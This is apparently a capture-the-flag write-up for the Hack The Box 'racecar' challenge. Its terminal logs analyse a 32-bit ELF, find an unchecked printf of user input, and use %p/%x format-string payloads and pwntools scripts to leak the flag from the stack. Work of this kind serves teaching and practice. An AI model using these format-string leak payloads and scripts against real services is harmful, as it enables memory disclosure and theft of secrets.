
#### 0. analyses ####
┌──(kali㉿kali)-[~/htb]
└─$ file racecar 
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
                                                                                                                                               
┌──(kali㉿kali)-[~/htb]
└─$ checksec racecar 
[*] '/home/kali/htb/racecar'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 
┌──(kali㉿kali)-[~/htb]
└─$ strings racecar 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
exit
srand
fopen
puts
time
putchar
stdin
printf
fgets
strlen
read
stdout
malloc
alarm
atoi
sleep
__cxa_finalize
setvbuf
strcmp
__libc_start_main
__stack_chk_fail
GLIBC_2.1
GLIBC_2.1.3
GLIBC_2.4
GLIBC_2.0
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
gfff
gfff
gfff
gfff
UWVS
[^_]
[1;33m
[1;36m
[1;32m
[1;31m
[1;34m
[1;35m
%s      ______                                       %s|xxx|
%s     /|_||_\`.__                                   %s| F |
%s    (   _    _ _\                                  %s|xxx|
%s*** =`-(_)--(_)-'                                  %s| I |
                                                   %s|xxx|
                                                   %s| N |
                                                   %s| I |
%s             _-_-  _/\______\__                    %s| S |
%s           _-_-__ / ,-. -|-  ,-.`-.                %s|xxx|
%s            _-_- `( o )----( o )-'                 %s| H |
%s                   `-'      `-'                    %s|xxx|
Select race:
1. Highway battle
2. Circuit
%s[-] Invalid choice!%s
Select car:
[*] Waiting for the race to finish...
[+] You won the race!! You get 100 coins!
[+] Current coins: [%d]%s
[!] Do you have anything to say to the press after your big victory?
> %s
flag.txt
%s[-] Could not open flag.txt. Please contact the creator.
[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
[-] You lost the race and all your coins!
%sInsert your data:
Name: 
Nickname: 
%s[+] Welcome [%s%s%s]!
%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!
[*] Current coins: [%d]
Car #1 stats:   
[Speed]:        %s
[Acceleration]: %s
[Handling]:     %s
Car #2 stats:   
[Speed]:        %s
[Acceleration]: %s
[Handling]:     %s
1. Car info
2. Car selection
;*2$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7283
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
racecar.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strcmp@@GLIBC_2.0
read@@GLIBC_2.0
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
printf@@GLIBC_2.0
fgets@@GLIBC_2.0
_edata
time@@GLIBC_2.0
sleep@@GLIBC_2.0
alarm@@GLIBC_2.0
__stack_chk_fail@@GLIBC_2.4
__x86.get_pc_thunk.dx
__cxa_finalize@@GLIBC_2.1.3
banner
malloc@@GLIBC_2.0
__data_start
puts@@GLIBC_2.0
__gmon_start__
exit@@GLIBC_2.0
__dso_handle
_IO_stdin_used
race_type
srand@@GLIBC_2.0
strlen@@GLIBC_2.0
__libc_start_main@@GLIBC_2.0
__libc_csu_init
car_menu
stdin@@GLIBC_2.0
read_int
setvbuf@@GLIBC_2.0
fopen@@GLIBC_2.1
putchar@@GLIBC_2.0
_fp_hw
car_info
stdout@@GLIBC_2.0
__bss_start
main
coins
__stack_chk_fail_local
check
atoi@@GLIBC_2.0
__TMC_END__
_ITM_registerTMCloneTable
setup
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
  
┌──(kali㉿kali)-[~/htb]
└─$ nm racecar
         U alarm@@GLIBC_2.0
         U atoi@@GLIBC_2.0
00000929 T banner
00004010 B __bss_start
000011d2 T car_info
00000c91 T car_menu
0000400c D check
00004008 D coins
00004010 b completed.7283
         w __cxa_finalize@@GLIBC_2.1.3
00004000 D __data_start
00004000 W data_start
000007e0 t deregister_tm_clones
00000870 t __do_global_dtors_aux
00003e90 d __do_global_dtors_aux_fini_array_entry
00004004 D __dso_handle
00003e94 d _DYNAMIC
00004010 D _edata
00004014 B _end
         U exit@@GLIBC_2.0
         U fgets@@GLIBC_2.0
00001514 T _fini
         U fopen@@GLIBC_2.1
00001528 R _fp_hw
000008c0 t frame_dummy
00003e8c d __frame_dummy_init_array_entry
00002018 r __FRAME_END__
00003f8c d _GLOBAL_OFFSET_TABLE_
         w __gmon_start__
00001d7c r __GNU_EH_FRAME_HDR
00001082 T info
00000618 T _init
00003e90 d __init_array_end
00003e8c d __init_array_start
0000152c R _IO_stdin_used
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
000014f0 T __libc_csu_fini
00001490 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
000013e1 T main
         U malloc@@GLIBC_2.0
00001352 T menu
         U printf@@GLIBC_2.0
         U putchar@@GLIBC_2.0
         U puts@@GLIBC_2.0
00000c02 T race_type
         U rand@@GLIBC_2.0
         U read@@GLIBC_2.0
000008cd T read_int
00000820 t register_tm_clones
00000b93 T setup
         U setvbuf@@GLIBC_2.0
         U sleep@@GLIBC_2.0
         U srand@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
00001500 T __stack_chk_fail_local
00000790 T _start
         U stdin@@GLIBC_2.0
         U stdout@@GLIBC_2.0
         U strcmp@@GLIBC_2.0
         U strlen@@GLIBC_2.0
         U time@@GLIBC_2.0
00004010 D __TMC_END__
000007d0 T __x86.get_pc_thunk.bx
000008c9 T __x86.get_pc_thunk.dx

┌──(kali㉿kali)-[~/htb]
└─$ readelf -s racecar 

Symbol table '.dynsym' contains 27 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.0 (2)
     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
     3: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.0 (2)
     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@GLIBC_2.0 (2)
     6: 00000000     0 FUNC    GLOBAL DEFAULT  UND time@GLIBC_2.0 (2)
     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND sleep@GLIBC_2.0 (2)
     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.0 (2)
     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.4 (3)
    10: 00000000     0 FUNC    WEAK   DEFAULT  UND [...]@GLIBC_2.1.3 (4)
    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.0 (2)
    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (2)
    13: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.0 (2)
    15: 00000000     0 FUNC    GLOBAL DEFAULT  UND srand@GLIBC_2.0 (2)
    16: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.0 (2)
    17: 00000000     0 FUNC    GLOBAL DEFAULT  UND __[...]@GLIBC_2.0 (2)
    18: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdin@GLIBC_2.0 (2)
    19: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.0 (2)
    20: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@GLIBC_2.1 (5)
    21: 00000000     0 FUNC    GLOBAL DEFAULT  UND putchar@GLIBC_2.0 (2)
    22: 00000000     0 FUNC    GLOBAL DEFAULT  UND rand@GLIBC_2.0 (2)
    23: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.0 (2)
    24: 00000000     0 FUNC    GLOBAL DEFAULT  UND atoi@GLIBC_2.0 (2)
    25: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
    26: 0000152c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used

Symbol table '.symtab' contains 96 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000154     0 SECTION LOCAL  DEFAULT    1 .interp
     2: 00000168     0 SECTION LOCAL  DEFAULT    2 .note.ABI-tag
     3: 00000188     0 SECTION LOCAL  DEFAULT    3 .note.gnu.build-id
     4: 000001ac     0 SECTION LOCAL  DEFAULT    4 .gnu.hash
     5: 000001cc     0 SECTION LOCAL  DEFAULT    5 .dynsym
     6: 0000037c     0 SECTION LOCAL  DEFAULT    6 .dynstr
     7: 000004a8     0 SECTION LOCAL  DEFAULT    7 .gnu.version
     8: 000004e0     0 SECTION LOCAL  DEFAULT    8 .gnu.version_r
     9: 00000530     0 SECTION LOCAL  DEFAULT    9 .rel.dyn
    10: 00000580     0 SECTION LOCAL  DEFAULT   10 .rel.plt
    11: 00000618     0 SECTION LOCAL  DEFAULT   11 .init
    12: 00000640     0 SECTION LOCAL  DEFAULT   12 .plt
    13: 00000780     0 SECTION LOCAL  DEFAULT   13 .plt.got
    14: 00000790     0 SECTION LOCAL  DEFAULT   14 .text
    15: 00001514     0 SECTION LOCAL  DEFAULT   15 .fini
    16: 00001528     0 SECTION LOCAL  DEFAULT   16 .rodata
    17: 00001d7c     0 SECTION LOCAL  DEFAULT   17 .eh_frame_hdr
    18: 00001df8     0 SECTION LOCAL  DEFAULT   18 .eh_frame
    19: 00003e8c     0 SECTION LOCAL  DEFAULT   19 .init_array
    20: 00003e90     0 SECTION LOCAL  DEFAULT   20 .fini_array
    21: 00003e94     0 SECTION LOCAL  DEFAULT   21 .dynamic
    22: 00003f8c     0 SECTION LOCAL  DEFAULT   22 .got
    23: 00004000     0 SECTION LOCAL  DEFAULT   23 .data
    24: 00004010     0 SECTION LOCAL  DEFAULT   24 .bss
    25: 00000000     0 SECTION LOCAL  DEFAULT   25 .comment
    26: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    27: 000007e0     0 FUNC    LOCAL  DEFAULT   14 deregister_tm_clones
    28: 00000820     0 FUNC    LOCAL  DEFAULT   14 register_tm_clones
    29: 00000870     0 FUNC    LOCAL  DEFAULT   14 __do_global_dtors_aux
    30: 00004010     1 OBJECT  LOCAL  DEFAULT   24 completed.7283
    31: 00003e90     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtor[...]
    32: 000008c0     0 FUNC    LOCAL  DEFAULT   14 frame_dummy
    33: 00003e8c     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_in[...]
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS racecar.c
    35: 00000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    36: 00002018     0 OBJECT  LOCAL  DEFAULT   18 __FRAME_END__
    37: 00000000     0 FILE    LOCAL  DEFAULT  ABS 
    38: 00003e90     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_end
    39: 00003e94     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
    40: 00003e8c     0 NOTYPE  LOCAL  DEFAULT   19 __init_array_start
    41: 00001d7c     0 NOTYPE  LOCAL  DEFAULT   17 __GNU_EH_FRAME_HDR
    42: 00003f8c     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    43: 000014f0     2 FUNC    GLOBAL DEFAULT   14 __libc_csu_fini
    44: 00000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@@GLIBC_2.0
    45: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.0
    46: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
    47: 000007d0     4 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.bx
    48: 00004000     0 NOTYPE  WEAK   DEFAULT   23 data_start
    49: 00000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.0
    50: 00000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.0
    51: 00004010     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    52: 00000000     0 FUNC    GLOBAL DEFAULT  UND time@@GLIBC_2.0
    53: 00000000     0 FUNC    GLOBAL DEFAULT  UND sleep@@GLIBC_2.0
    54: 00001352   143 FUNC    GLOBAL DEFAULT   14 menu
    55: 00001514     0 FUNC    GLOBAL DEFAULT   15 _fini
    56: 00000000     0 FUNC    GLOBAL DEFAULT  UND alarm@@GLIBC_2.0
    57: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail[...]
    58: 000008c9     0 FUNC    GLOBAL HIDDEN    14 __x86.get_pc_thunk.dx
    59: 00000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@@[...]
    60: 00000929   618 FUNC    GLOBAL DEFAULT   14 banner
    61: 00000000     0 FUNC    GLOBAL DEFAULT  UND malloc@@GLIBC_2.0
    62: 00004000     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    63: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.0
    64: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    65: 00000000     0 FUNC    GLOBAL DEFAULT  UND exit@@GLIBC_2.0
    66: 00004004     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle
    67: 0000152c     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
    68: 00000c02   143 FUNC    GLOBAL DEFAULT   14 race_type
    69: 00000000     0 FUNC    GLOBAL DEFAULT  UND srand@@GLIBC_2.0
    70: 00000000     0 FUNC    GLOBAL DEFAULT  UND strlen@@GLIBC_2.0
    71: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    72: 00001490    93 FUNC    GLOBAL DEFAULT   14 __libc_csu_init
    73: 00000c91  1009 FUNC    GLOBAL DEFAULT   14 car_menu
    74: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdin@@GLIBC_2.0
    75: 000008cd    92 FUNC    GLOBAL DEFAULT   14 read_int
    76: 00000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.0
    77: 00000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.1
    78: 00000000     0 FUNC    GLOBAL DEFAULT  UND putchar@@GLIBC_2.0
    79: 00004014     0 NOTYPE  GLOBAL DEFAULT   24 _end
    80: 00000790     0 FUNC    GLOBAL DEFAULT   14 _start
    81: 00001528     4 OBJECT  GLOBAL DEFAULT   16 _fp_hw
    82: 000011d2   384 FUNC    GLOBAL DEFAULT   14 car_info
    83: 00000000     0 FUNC    GLOBAL DEFAULT  UND rand@@GLIBC_2.0
    84: 00000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@@GLIBC_2.0
    85: 00004010     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    86: 000013e1   168 FUNC    GLOBAL DEFAULT   14 main
    87: 00004008     4 OBJECT  GLOBAL DEFAULT   23 coins
    88: 00001500    20 FUNC    GLOBAL HIDDEN    14 __stack_chk_fail[...]
    89: 0000400c     4 OBJECT  GLOBAL DEFAULT   23 check
    90: 00000000     0 FUNC    GLOBAL DEFAULT  UND atoi@@GLIBC_2.0
    91: 00004010     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__
    92: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
    93: 00000618     0 FUNC    GLOBAL DEFAULT   11 _init
    94: 00001082   336 FUNC    GLOBAL DEFAULT   14 info
    95: 00000b93   111 FUNC    GLOBAL DEFAULT   14 setup
                                                                                                                                               
┌──(kali㉿kali)-[~/htb]
└─$ 

#### 1. Static Analysis in IDA ####

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void car_menu(void)

{
  int iVar1;
  int iVar2;
  uint __seed;
  int iVar3;
  size_t sVar4;
  char *__format;
  FILE *__stream;
  int in_GS_OFFSET;
  undefined *puVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  uint local_54;
  char local_3c [44];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  uVar6 = 0xffffffff;
  uVar7 = 0xffffffff;
  do {
    printf(&DAT_00011948);
    iVar1 = read_int(uVar6,uVar7);
    if ((iVar1 != 2) && (iVar1 != 1)) {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  } while ((iVar1 != 2) && (iVar1 != 1));
  iVar2 = race_type();
  __seed = time((time_t *)0x0);
  srand(__seed);
  if (((iVar1 == 1) && (iVar2 == 2)) || ((iVar1 == 2 && (iVar2 == 2)))) {
    iVar2 = rand();
    iVar2 = iVar2 % 10;
    iVar3 = rand();
    iVar3 = iVar3 % 100;
  }
  else if (((iVar1 == 1) && (iVar2 == 1)) || ((iVar1 == 2 && (iVar2 == 1)))) {
    iVar2 = rand();
    iVar2 = iVar2 % 100;
    iVar3 = rand();
    iVar3 = iVar3 % 10;
  }
  else {
    iVar2 = rand();
    iVar2 = iVar2 % 100;
    iVar3 = rand();
    iVar3 = iVar3 % 100;
  }
  local_54 = 0;
  while( true ) {
    sVar4 = strlen("\n[*] Waiting for the race to finish...");
    if (sVar4 <= local_54) break;
    putchar((int)"\n[*] Waiting for the race to finish..."[local_54]);
    if ("\n[*] Waiting for the race to finish..."[local_54] == '.') {
      sleep(0);
    }
    local_54 = local_54 + 1;
  }
  if (((iVar1 == 1) && (iVar2 < iVar3)) || ((iVar1 == 2 && (iVar3 < iVar2)))) {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
    coins = coins + 100;
    puVar5 = &DAT_00011538;
    printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
           &DAT_000119de);
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m"
        );
    printf(__format);
  }
  else if (((iVar1 == 1) && (iVar3 < iVar2)) || ((iVar1 == 2 && (iVar2 < iVar3)))) {
    printf("%s\n\n[-] You lost the race and all your coins!\n",&DAT_00011548);
    coins = 0;
    printf("[+] Current coins: [%d]%s\n",0,&DAT_00011538);
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}


/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void read_int(void)

{
  int in_GS_OFFSET;
  char local_30 [32];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  read(0,local_30,0x1f);  
  atoi(local_30);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}

#### 2. Try Run ####

┌──(kali㉿kali)-[~/htb]
└─$ cat flag.txt
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH

Select car: 1 Select race: 2 || Select car: 2 Select race: 1 
+] You won the race!! You get 100 coins!                                                                                                      
[+] Current coins: [169]                                                                                                                       
                                                                                                                                               
[!] Do you have anything to say to the press after your big victory?                                                                           
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p                                                          

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x57961200 0x170 0x565ced85 0x2 0x5e 0x26 0x1 0x2 0x565cf96c 0x57961200 0x57961380 0x41414141 0x42424242 0x43434343 0x44444444 0x45454545 0x46464646 0x47474747 0x48484848 0x565c000a 0x579611a0 0x2 0xc6fa1e00 0xf7f364a0 0x565d1f8c 0xff893b98 0x565cf441 0xff893bc0

%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x %24$x %25$x %26$x 

┌──(kali㉿kali)-[~/htb]
└─$ nc 139.59.189.14 32050
[!] Do you have anything to say to the press after your big victory?                                                                           
> %12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x %24$x %25$x %26$x                                                    

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 85d49200 f7fc33fc 56604f8c ffccd358 


$ cat racecar_raw_flag.py
#!/usr/bin/env python3
import re

raw_flag='7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 85d49200 f7fc33fc 56604f8c ffccd358 '

raw_flag = raw_flag.split()[::-1]
# braek 7b425448 into ['ff', 'cc', 'd3', '58']
for i in range(len(raw_flag)):
	raw_flag[i] = re.findall('..', raw_flag[i])

flag = [] # asc to chr
for chars in raw_flag:
	word = ""
	for char in chars[::-1]:
		if char != '0x':
			word += chr(int(char, 16))
	flag.append(word)

flag.reverse()
print(''.join(flag))

┌──(kali㉿kali)-[~/htb]
└─$ ./racecar_rawflag.py 
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}Ôü3ü÷O`VXÓÌÿ

$ cat racecar_try.py
#!/usr/bin/env python3
from pwn import *
context.log_level = 'ERROR'

def exploit(payload: str):
	conn = process('./racecar')
	conn.sendlineafter(b'Name', b'fanzhefu')
	conn.sendlineafter(b'Nickname', b'fanzhefu')
	conn.sendlineafter(b'Car selection', b'2')
	conn.sendlineafter(b'Select car:', b'1')
	conn.sendlineafter(b'Circuit', b'2')
	conn.sendlineafter(b'victory?', bytes(payload, encoding='utf-8'))
	conn.recv()
	print(conn.recv().decode('utf-8'))
	conn.close()

if __name__ == '__main__':
	while True:
		exploit(input('Enter payload: '))

┌──(kali㉿kali)-[~/htb]
└─$ ./racecar_try.py
Enter payload: "%12$x %13$x %14$x %15$x %16$x %17$x %18$x %19$x %20$x %21$x %22$x %23$x %24$x %25$x %26$x"

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
"41414141 42424242 43434343 44444444 45454545 46464646 47474747 48484848 565e000a 57d191a0 2 47544800 f7f564a0 565e9f8c ff98f9c8"

#### 3. python ####
$cat racecar.py
#!/usr/bin/env python
from pwn import *
 
offset_start_flag = 12
len_of_flag = 44
offset_end_flag = offset_start_flag + (44 // 4)     # 44 characters / 4 bytes per hexadecimal = 11 hexadecimals
 
 
formatstring = ""
 
for i in range(offset_start_flag, offset_end_flag):
    formatstring += "%"+str(i)+"$p "
#'%12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p '
 
r = remote("139.59.189.14",32050)
 
 
r.sendlineafter(b"Name: ", b"fanzhefu")
r.sendlineafter(b"Nickname: ", b"fanzhefu")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"> ", b"1")
 
r.sendlineafter(b"> ", formatstring.encode())
r.recv()
response = r.recv()
# b'\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1b[0m\n0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f \n'
 
# Format output
preflag = (response.decode("utf-8").split("m\n"))[1]
#'0x7b425448 0x5f796877 0x5f643164 0x34735f31 0x745f3376 0x665f3368 0x5f67346c 0x745f6e30 0x355f3368 0x6b633474 0x7d213f \n'
preflag = preflag.split()
['0x7b425448', '0x5f796877', '0x5f643164', '0x34735f31', '0x745f3376', '0x665f3368', '0x5f67346c', '0x745f6e30', '0x355f3368', '0x6b633474', '0x7d213f']
flag = ""
for hexdecimal in preflag:
    flag += p32(int(hexdecimal, base=16)).decode("utf-8")
#>>> p32(int('0x7b425448',base=16)).decode("utf-8")
#'HTB{' 
print(flag)

'''
                                                                                                                                               
┌──(kali㉿kali)-[~/htb]
└─$ ./racecar.py
[+] Opening connection to 144.126.236.38 on port 30131: Done
HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}\x00
[*] Closed connection to 144.126.236.38 port 30131
'''












